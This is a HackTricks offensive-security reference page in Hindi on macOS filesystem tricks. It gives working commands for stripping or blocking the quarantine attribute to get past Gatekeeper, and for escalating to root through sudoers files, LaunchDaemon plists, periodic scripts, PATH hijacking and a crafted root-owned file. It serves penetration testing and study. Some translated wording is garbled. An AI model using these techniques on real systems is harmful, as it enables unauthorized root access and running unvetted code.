# macOS FS Tricks

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन **HackTricks** में देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन **The PEASS Family** की खोज करें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## POSIX अनुमतियाँ संयोजन

**डायरेक्टरी** में अनुमतियाँ:

* **पढ़ें** - आप **डायरेक्टरी एंट्रीज़ को गणना** कर सकते हैं
* **लिखें** - आप **फ़ाइलें हटा/लिख सकते हैं** डायरेक्टरी में और आप **खाली फ़ोल्डर्स को हटा सकते हैं**।
* लेकिन आप **गैर-खाली फ़ोल्डर्स को हटा/संशोधित नहीं कर सकते** जब तक आपके पास उसके लिए लिखने की अनुमति नहीं है।
* आप **एक फ़ोल्डर का नाम संशोधित नहीं कर सकते** जब तक आप उसके मालिक नहीं हैं।
* **क्रियान्वित** - आपको **डायरेक्टरी को चलने की अनुमति** है - अगर आपके पास यह अधिकार नहीं है, तो आप इसमें कोई भी फ़ाइल तक पहुंच नहीं सकते, या किसी भी सब-डायरेक्टरी में।

### खतरनाक संयोजन

**कैसे एक फ़ाइल/फ़ोल्डर को ओवरराइट करें जिसका मालिक root है**, लेकिन:

* पथ में एक माता **डायरेक्टरी मालिक** उपयोगकर्ता है
* पथ में एक माता **डायरेक्टरी मालिक** एक **उपयोगकर्ता समूह** है जिसके **लेखन अधिकार** हैं
* एक उपयोगकर्ता **समूह** को **फ़ाइल** के लिए **लेखन** की **अनुमति** है

पिछले किसी भी संयोजनों के साथ, एक हमलावर **एक उच्चाधिकारित अर्बिट्रे राइट प्राप्त करने के लिए** एक **सिम/हार्ड लिंक** को अंतर्निहित पथ में इंजेक्ट कर सकता है।

### फ़ोल्डर रूट R+X विशेष मामला

अगर किसी **डायरेक्टरी** में फ़ाइलें हैं जहां **केवल root को R+X एक्सेस** है, तो वे **किसी और के लिए पहुंचने योग्य नहीं हैं**। इसलिए एक वंशावली को **एक उपयोगकर्ता द्वारा पढ़ा जा सकने वाली फ़ाइल** को, जिसे उस **प्रतिबंध** के कारण पढ़ा नहीं जा सकता, इस फ़ोल्डर से **एक अलग वाले में** ले जाने की एक विशेषता का उपयोग किया जा सकता है, ताकि इन फ़ाइलों को पढ़ने के लिए उन्हें अभद्र किया जा सके।

उदाहरण: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## सिम्बॉलिक लिंक / हार्ड लिंक

यदि एक उच्चाधिकारित प्रक्रिया **फ़ाइल** में डेटा लिख रही है जो एक **निम्न अधिकारित उपयोगकर्ता द्वारा नियंत्रित किया जा सकता है**, या जो पहले से ही एक निम्न अधिकारित उपयोगकर्ता द्वारा बनाई गई हो सकती है। उपयोगकर्ता बस एक सिम्बॉलिक या हार्ड लिंक के माध्यम से इसे दूसरी फ़ाइल पर पॉइंट कर सकता है, और उच्चाधिकारित प्रक्रिया उस फ़ाइल पर लिखेगी।

जांचें अन्य खंडों में कि एक हमलावर कैसे **उच्चाधिकार अर्बिट्रे राइट का दुरुपयोग करके अधिकारों को उन्नत कर सकता है**।

## .fileloc

**`.fileloc`** एक्सटेंशन वाली फ़ाइलें अन्य एप्लिकेशन या बाइनरीज़ को पॉइंट कर सकती हैं ताकि जब वे खोले जाएं, तो एप्लिकेशन/बाइनरी वह एक्सीक्यूट किया जाए।\
उदाहरण:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## अनियमित एफडी

यदि आप **प्रक्रिया को एक फ़ाइल या फ़ोल्डर को उच्च विशेषाधिकारों के साथ खोलने** के लिए कर सकते हैं, तो आप **`crontab`** का दुरुपयोग कर सकते हैं ताकि `/etc/sudoers.d` में एक फ़ाइल को **`EDITOR=exploit.py`** के साथ खोलें, इस प्रकार `exploit.py` `/etc/sudoers` के अंदर फ़ाइल को प्राप्त करेगा और इसका दुरुपयोग करेगा।

उदाहरण के लिए: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## जांच निगरानी xattrs ट्रिक्स से बचें

### हटाएं
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable फ्लैग

यदि एक फ़ाइल/फ़ोल्डर में यह अपरिवर्तनीय गुण है तो उस पर xattr नहीं लगाया जा सकेगा।
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs माउंट

**devfs** माउंट **xattr का समर्थन नहीं करता**, अधिक जानकारी [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) में मिलेगी।
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### लेखेंएक्सट्रिब्यूट ACL

यह ACL फ़ाइल में `xattrs` जोड़ने से रोकता है।
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** फ़ाइल प्रारूप एक फ़ाइल की ACEs के साथ एक फ़ाइल की प्रतिलिपि बनाता है।

[**स्रोत कोड**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में देखा जा सकता है कि ACL पाठ प्रतिनिधित्व जो `com.apple.acl.text` नामक xattr में संग्रहीत है, उसे डीकंप्रेस की गई फ़ाइल में ACL के रूप में सेट किया जाएगा। इसलिए, अगर आपने एक एप्लिकेशन को एक zip फ़ाइल में AppleDouble फ़ाइल प्रारूप के साथ संकुचित किया है जिसमें एक ACL है जो अन्य xattrs को लिखने से रोकता है... तो quarantine xattr एप्लिकेशन में सेट नहीं हुआ था:

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) देखें।

इसे प्रतिरूपित करने के लिए हमें पहले सही acl स्ट्रिंग प्राप्त करनी होगी:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

वास्तव में आवश्यक नहीं है लेकिन मैं उसे वहाँ छोड़ देता हूँ बस इस स्थिति में:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## कोड हस्ताक्षरों को उमकरना

बंडल में फ़ाइल **`_CodeSignature/CodeResources`** शामिल है जिसमें **हर एक फ़ाइल** का **हैश** होता है। ध्यान दें कि CodeResources का हैश भी **कृत्रिम** में शामिल है, इसलिए हम उसके साथ खिलवाड़ नहीं कर सकते।

हालांकि, कुछ ऐसी फ़ाइलें हैं जिनके हस्ताक्षर की जांच नहीं की जाएगी, जिनमें plist में छोड़ नामक कुंजी है, जैसे:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
आप CLI से एक संसाधन के हस्ताक्षर की गणना कर सकते हैं:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## माउंट डीएमजीएस

एक उपयोगकर्ता एक कस्टम डीएमजी तैयार करके उसे मौजूदा कुछ मौजूदा फोल्डर्स के ऊपर भी माउंट कर सकता है। निम्नलिखित है कि आप कैसे कस्टम सामग्री के साथ एक कस्टम डीएमजी पैकेज बना सकते हैं:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

सामान्यत: macOS डिस्क को `com.apple.DiskArbitrarion.diskarbitrariond` Mach सेवा के साथ माउंट करता है (जो `/usr/libexec/diskarbitrationd` द्वारा प्रदान किया जाता है)। यदि LaunchDaemons plist फ़ाइल में पैरामीटर `-d` जोड़ा जाए और पुनः आरंभ किया जाए, तो यह लॉग `/var/log/diskarbitrationd.log` में स्टोर करेगा।\
हालांकि, `hdik` और `hdiutil` जैसे उपकरणों का उपयोग करके `com.apple.driver.DiskImages` kext के साथ सीधे संवाद किया जा सकता है।

## अनियमित लेखन

### आवश्यक sh स्क्रिप्ट

यदि आपका स्क्रिप्ट **शैल स्क्रिप्ट** के रूप में व्याख्या की जा सकती है, तो आप **`/etc/periodic/daily/999.local`** शैल स्क्रिप्ट को अधिलेखित कर सकते हैं जो प्रतिदिन प्रेरित किया जाएगा।

आप इस स्क्रिप्ट का **फर्जी** निष्पादन कर सकते हैं: **`sudo periodic daily`**

### डेमन्स

एक अनियमित **LaunchDaemon** जैसे **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** लिखें जिसमें एक प्लिस्ट है जो एक अनियमित स्क्रिप्ट को निष्पादित करता है जैसे:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### सुडोएर्स फ़ाइल

यदि आपके पास **अनिश्चित लेखन** है, तो आप **`/etc/sudoers.d/`** फ़ोल्डर में एक फ़ाइल बना सकते हैं जिसमें आपको **सुडो** अधिकार देने के लिए.

### PATH फ़ाइलें

फ़ाइल **`/etc/paths`** मुख्य स्थानों में से एक है जो PATH env चर में डेटा भरता है। आपको इसे ओवरराइट करने के लिए रूट होना चाहिए, लेकिन यदि कोई **विशेषाधिकारित प्रक्रिया** स्क्रिप्ट को बिना पूर्ण पथ के **कमांड चला रहा है**, तो आप इसे संशोधित करके **हाइजैक** कर सकते हैं।

आप नए फ़ोल्डर को `PATH` env चर में लोड करने के लिए **`/etc/paths.d`** में फ़ाइलें लिख सकते हैं।

## अन्य उपयोगकर्ताओं के रूप में लिखने योग्य फ़ाइलें उत्पन्न करें

यह एक फ़ाइल उत्पन्न करेगा जो रूट का है और मेरे द्वारा लिखने योग्य है ([**यहाँ से कोड**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). यह भी privesc के रूप में काम कर सकता है:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX साझा स्मृति

**POSIX साझा स्मृति** POSIX-संगत ऑपरेटिंग सिस्टम में प्रक्रियाओं को एक साझा स्मृति क्षेत्र तक पहुंचने की अनुमति देता है, जो अन्य इंटर-प्रोसेस संचार विधियों की तुलना में तेज़ संचार को सुविधाजनक बनाता है। इसमें `shm_open()` का उपयोग करके एक साझा स्मृति वस्तु बनाना या खोलना, `ftruncate()` का उपयोग करके इसका आकार सेट करना, और `mmap()` का उपयोग करके इसे प्रक्रिया के पता स्थान में मैप करना शामिल है। प्रक्रियाएँ फिर इस स्मृति क्षेत्र से सीधे पढ़ सकती हैं और इसमें लिख सकती हैं। समकालिक पहुंच को प्रबंधित करने और डेटा का क्षति होने से रोकने के लिए समक्रमण यंत्र जैसे म्यूटेक्स या सेमाफोर अक्सर उपयोग किए जाते हैं। अंत में, प्रक्रियाएँ `munmap()` और `close()` के साथ साझा स्मृति को अनमैप और बंद करती हैं, और वैकल्पिक रूप से `shm_unlink()` के साथ स्मृति वस्तु को हटा सकती हैं। यह प्रणाली विशेष रूप से उस पर्यावेक्षित, तेज IPC के लिए प्रभावी है जहां कई प्रक्रियाएँ साझा डेटा का त्वरित रूप से पहुंचने की आवश्यकता होती है।

<details>

<summary>निर्माता कोड उदाहरण</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>उपभोक्ता कोड उदाहरण</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**मैकओएस गार्डेड डिस्क्रिप्टर्स** मैकओएस में एक सुरक्षा सुविधा है जो उपयोगकर्ता अनुप्रयोगों में **फ़ाइल डिस्क्रिप्टर ऑपरेशन्स** की सुरक्षा और विश्वसनीयता को बढ़ाने के लिए लायी गई है। ये गार्डेड डिस्क्रिप्टर्स फ़ाइल डिस्क्रिप्टर्स के साथ विशेष प्रतिबंध या "गार्ड" को जोड़ने का एक तरीका प्रदान करते हैं, जिन्हें कर्नेल द्वारा प्रवर्तित किया जाता है।

यह सुविधा किसी विशेष प्रकार की सुरक्षा दुर्बलताओं जैसे **अनधिकृत फ़ाइल एक्सेस** या **रेस कंडीशन्स** को रोकने के लिए विशेष रूप से उपयोगी है। ये दुर्बलताएँ उत्पन्न होती हैं जब किसी धागे द्वारा एक फ़ाइल विवरण तक पहुंच दिया जाता है **एक और दुर्बल धागा उसके ऊपर पहुंच पाता है** या जब एक फ़ाइल डिस्क्रिप्टर **एक दुर्बल बच्चा प्रक्रिया द्वारा विरासत में दिया जाता है**। इस सुविधा से संबंधित कुछ फ़ंक्शन हैं:

* `guarded_open_np`: गार्ड के साथ एफडी खोलें
* `guarded_close_np`: इसे बंद करें
* `change_fdguard_np`: एक डिस्क्रिप्टर पर गार्ड फ्लैग बदलें (गार्ड सुरक्षा को हटाने के लिए भी)

## संदर्भ

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>जीर्ण AWS हैकिंग को शून्य से हीरो तक सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

हैकट्रिक्स का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन हैकट्रिक्स में देखना चाहते हैं** या **हैकट्रिक्स को पीडीएफ़ में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक पीईएएस और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**द पीईएएस फैमिली**](https://opensea.io/collection/the-peass-family) खोजें, हमारा विशेष [**एनएफटीएस**](https://opensea.io/collection/the-peass-family) संग्रह खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फ़ॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** हैकट्रिक्स और हैकट्रिक्स क्लाउड गिटहब रेपो में पीआर जमा करके।

</details>
